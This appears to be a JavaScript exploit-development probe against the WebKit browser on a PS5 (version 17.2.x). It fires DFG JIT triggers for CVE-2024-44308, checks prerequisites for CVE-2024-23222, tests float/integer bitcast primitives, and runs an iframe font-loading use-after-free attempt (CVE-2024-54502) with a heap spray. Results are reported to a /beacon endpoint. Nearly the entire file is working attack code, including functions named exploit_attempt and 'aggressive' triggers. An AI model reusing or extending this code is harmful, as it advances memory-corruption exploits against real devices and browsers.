/* p99-jit-prereq — CVE-2024-44308 + CVE-2024-23222 prerequisite tests
 *
 * CVE-2024-44308: DFG JIT uninitialized register in compilePutByValForIntTypedArray
 *   when storing non-truncatable double into Uint32Array backed by resizable ArrayBuffer.
 *   Fixed Safari 18.1.1 (Nov 2024). PS5 = 17.2.x = MASSIVELY PRE-FIX.
 *   Exodus Intelligence published full exploit. No WASM needed.
 *
 * CVE-2024-23222: JIT type confusion via property watchpoint race.
 *   Fixed Safari 17.3 (Jan 2024). PS5 = 17.2.x = pre-fix.
 *   Needs WASM for original R/W path, but butterfly corruption alternative exists.
 *
 * Beacon prefix: V99J-
 */
(function(){
"use strict";
var RUN_ID = "v99j" + Math.random().toString(36).slice(2,12);
var PREFIX = "V99J-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press99-jit-prereq");

/* ====== J1: Resizable ArrayBuffer prerequisites ====== */
function test_J1() {
  var r = {};
  try {
    // Test direct construction of resizable ArrayBuffer
    try {
      var rab = new ArrayBuffer(8, {maxByteLength: 64});
      r.RAB_CTOR = true;
      r.rabByteLength = rab.byteLength;
      r.rabMaxByteLength = rab.maxByteLength;
      r.rabResizable = rab.resizable;

      // Test resize
      try {
        rab.resize(32);
        r.rabResized = rab.byteLength;
        r.RESIZE_WORKS = true;
      } catch(e) {
        r.resizeErr = e.name + ':' + e.message.slice(0,40);
      }

      // Test Uint32Array on resizable AB
      try {
        var rab2 = new ArrayBuffer(16, {maxByteLength: 128});
        var u32 = new Uint32Array(rab2);
        u32[0] = 0x41414141;
        r.u32OnRAB = true;
        r.u32Length = u32.length;

        // Resize and check
        rab2.resize(32);
        r.u32AfterResize = u32.length;
        r.U32_RAB_WORKS = true;
      } catch(e) {
        r.u32RabErr = e.name + ':' + e.message.slice(0,40);
      }

      // Test Float64Array on resizable AB
      try {
        var rab3 = new ArrayBuffer(16, {maxByteLength: 128});
        var f64 = new Float64Array(rab3);
        f64[0] = 1.1;
        r.f64OnRAB = true;
        r.F64_RAB_WORKS = true;
      } catch(e) {
        r.f64RabErr = e.name + ':' + e.message.slice(0,40);
      }

    } catch(e) {
      r.RAB_CTOR = false;
      r.rabCtorErr = e.name + ':' + e.message.slice(0,50);
    }

    // BigUint64Array
    r.BigUint64Array = typeof BigUint64Array !== 'undefined';
    r.BigInt64Array = typeof BigInt64Array !== 'undefined';
    r.BigInt = typeof BigInt !== 'undefined';
    if (r.BigUint64Array) {
      try {
        var bu64 = new BigUint64Array(4);
        bu64[0] = BigInt("0x4141414141414141");
        r.bu64Val = bu64[0].toString(16);
        r.BU64_WORKS = true;
      } catch(e) {
        r.bu64Err = e.name + ':' + e.message.slice(0,40);
      }
    }

    // BigUint64Array on resizable AB
    if (r.RAB_CTOR && r.BigUint64Array) {
      try {
        var rab4 = new ArrayBuffer(16, {maxByteLength: 128});
        var bu64r = new BigUint64Array(rab4);
        bu64r[0] = BigInt(1);
        r.BU64_ON_RAB = true;
      } catch(e) {
        r.bu64RabErr = e.name + ':' + e.message.slice(0,40);
      }
    }

    B("J1-RAB-PREREQ", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("J1-RAB-PREREQ", r); }
}

/* ====== J2: DFG JIT warmup + basic trigger shape ====== */
function test_J2() {
  var r = {};
  try {
    // The CVE-2024-44308 bug: storing NaN/Infinity into Uint32Array[i] on resizable AB
    // triggers the slow path where scratch2GPR is uninitialized.
    // The key is that the value must NOT be truncatable to int32 (NaN, Infinity, -Infinity).

    try {
      var rab = new ArrayBuffer(256, {maxByteLength: 1024});
      var u32 = new Uint32Array(rab);

      // Warm up DFG with normal stores
      function hotStore(arr, idx, val) {
        arr[idx] = val;
      }

      for (var i = 0; i < 50000; i++) {
        hotStore(u32, i % 64, i);
      }
      r.warmupDone = true;

      // Now trigger with non-truncatable value on the hot path
      // NaN cannot be truncated to int32 — this hits the slow path
      // where the uninitialized register is used
      try {
        hotStore(u32, 0, NaN);
        r.nanStore = u32[0];
        hotStore(u32, 1, Infinity);
        r.infStore = u32[1];
        hotStore(u32, 2, -Infinity);
        r.negInfStore = u32[2];
        hotStore(u32, 3, 1.7976931348623157e+308); // DBL_MAX
        r.dblMaxStore = u32[3];

        // Check if values are corrupted (sign of the bug triggering)
        r.STORES_DONE = true;
      } catch(e) {
        r.storeErr = e.name + ':' + e.message.slice(0,40);
      }

      // Now try with resize between warmup and trigger
      try {
        var rab2 = new ArrayBuffer(64, {maxByteLength: 512});
        var u32b = new Uint32Array(rab2);

        function hotStore2(arr, idx, val) {
          arr[idx] = val;
        }

        for (var j = 0; j < 50000; j++) {
          hotStore2(u32b, j % 16, j);
        }

        // Resize to larger — may affect DFG assumptions about length
        rab2.resize(256);

        // Store NaN after resize
        hotStore2(u32b, 0, NaN);
        r.nanAfterResize = u32b[0];
        hotStore2(u32b, 32, NaN); // Beyond original length
        r.nanBeyondOrig = u32b[32];
        r.RESIZE_TRIGGER = true;
      } catch(e) {
        r.resizeTriggerErr = e.name + ':' + e.message.slice(0,40);
      }

    } catch(e) {
      r.rabErr = e.name + ':' + e.message.slice(0,50);
    }

    B("J2-DFG-BASIC", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("J2-DFG-BASIC", r); }
}

/* ====== J3: CVE-2024-23222 prerequisites ====== */
function test_J3() {
  var r = {};
  try {
    // Worker availability (needed for CVE-2024-23222)
    r.Worker = typeof Worker !== 'undefined';
    r.SharedWorker = typeof SharedWorker !== 'undefined';

    // Test if we can create a Blob URL worker
    if (r.Worker) {
      try {
        var blob = new Blob(['postMessage("alive")'], {type: 'text/javascript'});
        var url = URL.createObjectURL(blob);
        var w = new Worker(url);
        w.onmessage = function(e) {
          r.workerMsg = e.data;
          r.WORKER_WORKS = true;
          w.terminate();
          URL.revokeObjectURL(url);
          B("J3-WORKER-PREREQ", r);
        };
        w.onerror = function(e) {
          r.workerErr = e.message ? e.message.slice(0,40) : 'error';
          r.WORKER_WORKS = false;
          B("J3-WORKER-PREREQ", r);
        };
        // Timeout fallback
        setTimeout(function() {
          if (!r.WORKER_WORKS && r.WORKER_WORKS !== false) {
            r.WORKER_WORKS = false;
            r.workerTimeout = true;
            B("J3-WORKER-PREREQ", r);
          }
        }, 3000);
        return; // Wait for async
      } catch(e) {
        r.workerCtorErr = e.name + ':' + e.message.slice(0,40);
      }
    }

    // JIT type confusion prerequisites
    r.Proxy = typeof Proxy !== 'undefined';
    r.WeakRef = typeof WeakRef !== 'undefined';
    r.FinalizationRegistry = typeof FinalizationRegistry !== 'undefined';

    // Watchpoint-related: property access patterns
    try {
      var obj = {x: 1.1};
      var arr = [obj];
      function readProp(o) { return o.x; }
      for (var i = 0; i < 50000; i++) readProp(obj);
      obj.x = {}; // Transition structure — watchpoint fires
      var result = readProp(obj);
      r.watchpointResult = typeof result;
      r.WATCHPOINT_TEST = true;
    } catch(e) {
      r.watchpointErr = e.name + ':' + e.message.slice(0,40);
    }

    B("J3-WORKER-PREREQ", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("J3-WORKER-PREREQ", r); }
}

/* ====== J4: Float64Array ↔ Uint32Array type confusion probe ====== */
function test_J4() {
  var r = {};
  try {
    // Test if we can observe JIT deoptimization artifacts
    // The Exodus exploit for CVE-2024-44308 uses the stale register
    // to leak a stack pointer, then builds addrof/fakeobj

    var rab = new ArrayBuffer(64, {maxByteLength: 256});
    var f64 = new Float64Array(rab);
    var u32 = new Uint32Array(rab);

    // Write a known float pattern
    f64[0] = 1.1; // 0x3FF199999999999A in IEEE 754
    r.f64_as_u32_lo = u32[0];
    r.f64_as_u32_hi = u32[1];
    r.BITCAST_WORKS = (u32[1] === 0x3FF19999);

    // Write pointer-like values via u32
    u32[0] = 0xDEADBEEF;
    u32[1] = 0x00007FFF;
    r.u32_as_f64 = f64[0];
    r.UNION_READ = true;

    // Aggressive DFG trigger with tight loop
    function trigger(arr, n) {
      for (var i = 0; i < n; i++) {
        arr[i % arr.length] = i < n-1 ? i : NaN;
      }
      return arr[0];
    }

    // Warm to DFG/FTL
    var testBuf = new ArrayBuffer(256, {maxByteLength: 512});
    var testArr = new Uint32Array(testBuf);
    for (var round = 0; round < 5; round++) {
      trigger(testArr, 100000);
    }
    r.triggerResult = testArr[0];
    r.DFG_TRIGGERED = true;

    // Check for corruption artifacts
    var check = new Uint32Array(testBuf);
    var unusual = 0;
    for (var k = 0; k < check.length; k++) {
      if (check[k] > 0x7FFFFFFF) unusual++;
    }
    r.unusualValues = unusual;

    B("J4-TYPE-CONFUSION", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("J4-TYPE-CONFUSION", r); }
}

/* ====== J5: Aggressive CVE-2024-44308 trigger attempt ====== */
function test_J5() {
  B("J5-START", "aggressive-44308");
  var r = {};
  try {
    // Based on Exodus Intelligence analysis:
    // The bug is in compilePutByValForIntTypedArray() in DFGSpeculativeJIT.cpp
    // When the value is a double that can't be truncated to int32 (NaN/Inf),
    // the code jumps to slow path. But scratch2GPR hasn't been allocated yet.
    // The slow path call clobbers registers, and the stale value in scratch2GPR's
    // stack slot gets used later.

    // Key requirements:
    // 1. Uint32Array backed by resizable ArrayBuffer (triggers the specific code path)
    // 2. DFG must compile the function (warm it up)
    // 3. Pass a value that's a double but NOT truncatable to int32

    var ITERATIONS = 200000;

    function exploit_attempt(rab, u32view) {
      // Hot loop with normal int stores to trigger DFG compilation
      for (var i = 0; i < ITERATIONS; i++) {
        u32view[i & 63] = i;
      }
      // Now the critical store — NaN is not truncatable to int32
      // This should hit the buggy slow path in DFG-compiled code
      u32view[0] = NaN;
      u32view[1] = Infinity;
      u32view[2] = -Infinity;
      u32view[3] = 0/0; // Also NaN
      u32view[4] = Number.POSITIVE_INFINITY;
    }

    var rab = new ArrayBuffer(512, {maxByteLength: 4096});
    var u32 = new Uint32Array(rab);

    // Run multiple rounds to ensure DFG compilation
    for (var round = 0; round < 10; round++) {
      exploit_attempt(rab, u32);
    }

    r.val0 = u32[0]; // Should be 0 (NaN → 0 in spec), but bug may leave stale value
    r.val1 = u32[1]; // Should be 0 (Infinity → 0)
    r.val2 = u32[2];
    r.val3 = u32[3];
    r.val4 = u32[4];

    // If any values are NOT 0, the bug may have triggered
    r.ANOMALY = (u32[0] !== 0 || u32[1] !== 0 || u32[2] !== 0 || u32[3] !== 0 || u32[4] !== 0);
    r.SURVIVED = true;

    // Also try with resize between warmup and trigger
    var rab2 = new ArrayBuffer(64, {maxByteLength: 2048});
    var u32b = new Uint32Array(rab2);

    function exploit2(arr, val) {
      arr[0] = val;
    }

    for (var w = 0; w < ITERATIONS; w++) {
      exploit2(u32b, w);
    }

    rab2.resize(1024);
    exploit2(u32b, NaN);
    r.resizeVal = u32b[0];
    r.RESIZE_ANOMALY = (u32b[0] !== 0);

    B("J5-AGGRESSIVE", r);
  } catch(e) {
    r.err = e.name + ":" + e.message.slice(0,60);
    r.CRASHED = false; // If we're here, we didn't crash
    B("J5-ERR", r);
  }
}

/* ====== J6: CORRECTED CVE-2024-54502 UAF trigger ====== */
function test_J6() {
  B("J6-START", "corrected-uaf-trigger");
  var r = {};
  try {
    // Step 1: Cache font in parent with DIFFERENT URL than helper
    var style = document.createElement('style');
    style.textContent = '@font-face{font-family:"uaf";src:url(f0.ttf) format("truetype")} body{font-family:"uaf",sans-serif}';
    document.head.appendChild(style);
    document.body.offsetHeight;

    setTimeout(function() {
      r.parentFontCached = true;

      // Step 2: Create iframes with src= navigation (NOT document.write)
      // Each iframe loads uaf-helper.html which uses f99.ttf (different URL)
      // The iframe onload in PARENT removes the iframe — this is the trigger
      var NUM = 4;
      var loaded = 0;
      var removed = 0;

      for (var i = 0; i < NUM; i++) {
        (function(idx) {
          var iframe = document.createElement('iframe');
          iframe.id = 'uaf6_' + idx;
          iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';

          // CRITICAL: onload on PARENT's iframe element
          // This fires when iframe finishes loading (including fonts)
          // At this moment, fontLoadingTimerFired() may be executing
          iframe.onload = function() {
            loaded++;
            // Remove iframe immediately — destroys the iframe's Document
            // while fontLoadingTimerFired() may still be on the call stack
            var el = document.getElementById('uaf6_' + idx);
            if (el) {
              el.remove();
              removed++;
            }
          };

          // CRITICAL: Use src= navigation, NOT document.write
          iframe.src = 'uaf-helper.html?bust=' + RUN_ID + '_' + idx;
          document.body.appendChild(iframe);
        })(i);
      }

      // Survival check — if this never fires, the page crashed
      setTimeout(function() {
        r.loaded = loaded;
        r.removed = removed;
        r.SURVIVED = true;
        style.remove();
        B("J6-UAF-CORRECTED", r);
      }, 5000);

    }, 2000);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("J6-UAF-ERR", r); }
}

/* ====== J7: Aggressive corrected UAF — more iframes + heap spray ====== */
function test_J7() {
  B("J7-START", "aggressive-corrected-uaf");
  var r = {};
  try {
    var style = document.createElement('style');
    style.textContent = '@font-face{font-family:"uaf7";src:url(f1.ttf) format("truetype")} .u7{font-family:"uaf7",sans-serif}';
    document.head.appendChild(style);
    var pre = document.createElement('div');
    pre.className = 'u7';
    pre.style.cssText = 'position:absolute;left:-9999px;font-size:48px;';
    pre.textContent = 'PRELOAD';
    document.body.appendChild(pre);
    pre.offsetWidth;

    setTimeout(function() {
      pre.remove();

      var NUM = 16;
      var loaded = 0;
      var removed = 0;

      for (var i = 0; i < NUM; i++) {
        (function(idx) {
          var iframe = document.createElement('iframe');
          iframe.id = 'uaf7_' + idx;
          iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';

          iframe.onload = function() {
            loaded++;
            var el = document.getElementById('uaf7_' + idx);
            if (el) {
              el.remove();
              removed++;
              // Heap spray: try to reclaim Document memory
              for (var s = 0; s < 100; s++) {
                try {
                  var ab = new ArrayBuffer(512);
                  var v = new Uint32Array(ab);
                  for (var k = 0; k < v.length; k++) v[k] = 0x41414141;
                } catch(e) {}
              }
            }
          };

          iframe.src = 'uaf-helper.html?agg=' + RUN_ID + '_' + idx;
          document.body.appendChild(iframe);
        })(i);
      }

      setTimeout(function() {
        r.loaded = loaded;
        r.removed = removed;
        r.SURVIVED = true;
        style.remove();
        B("J7-UAF-AGGRESSIVE", r);
      }, 8000);
    }, 2000);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("J7-UAF-ERR", r); }
}

/* ====== Run ====== */
try {
  test_J1();                    // RAB prerequisites (0ms)
  setTimeout(test_J2, 3000);    // DFG basic trigger (3s)
  setTimeout(test_J3, 8000);    // Worker prereqs (8s)
  setTimeout(test_J4, 13000);   // Type confusion probe (13s)
  setTimeout(test_J5, 20000);   // Aggressive 44308 trigger (20s)
  setTimeout(test_J6, 35000);   // Corrected UAF trigger (35s)
  setTimeout(test_J7, 48000);   // Aggressive corrected UAF (48s)
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 4000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe99-done"); }, 70000);
})();
